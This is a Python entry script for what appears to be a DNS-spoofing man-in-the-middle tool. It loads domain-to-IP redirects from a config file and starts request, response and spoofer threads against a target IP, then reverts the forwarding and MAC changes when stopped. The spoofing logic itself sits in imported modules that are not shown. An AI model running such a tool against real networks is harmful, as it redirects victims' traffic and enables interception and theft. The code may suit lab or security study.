from Spoofer import Spoofer
from InputDNSRequestProcessing import InputDNSRequestProcessing
from InputDNSResponseProcessing import InputDNSResponseProcessing
import time
import sys

def loading_configuration() -> dict:
    configuration_entries = dict()
    with open("changed_entries.conf","r") as file:
        for line in file.readlines():
            print(line)
            try:
                key = line.split(":")[0].strip()
                value = line.split(":")[1].strip()
                configuration_entries[key] = value
            except Exception as e:
                print(f"Configuration loading failed fetching an entry, check configuration file: {e}")
    return configuration_entries

if __name__ == "__main__":

    if len(sys.argv)!= 3:
        print("Usage : main.py <target_ip> <network_interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    interface = sys.argv[2]

    print("Trying to load configuration file")
    dictionnary_dns_entry_ip = loading_configuration()
    print("Loading success !")
    print("Dictionnary used is : ")
    print(dictionnary_dns_entry_ip)
    input_requests_processor = InputDNSRequestProcessing(target_ip,interface,dictionnary_dns_entry_ip)
    input_response_processor = InputDNSResponseProcessing(target_ip,interface)
    spoofer = Spoofer(target_ip,interface)

    input_requests_processor.start()
    input_response_processor.start()
    spoofer.start()    

    try:
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        
        print("\nStopping attack!")

        input_requests_processor.stop()
        input_requests_processor.join()
        print("Input request processor stopped")
        input_response_processor.stop()
        input_response_processor.join()
        print("Input response processor stopped")
        
        spoofer.stop()
        Spoofer.disable_packet_forwarding()
        spoofer.remove_filter_dns_server()
        spoofer.join()
        print("Finishing reverting corrected MAC address")

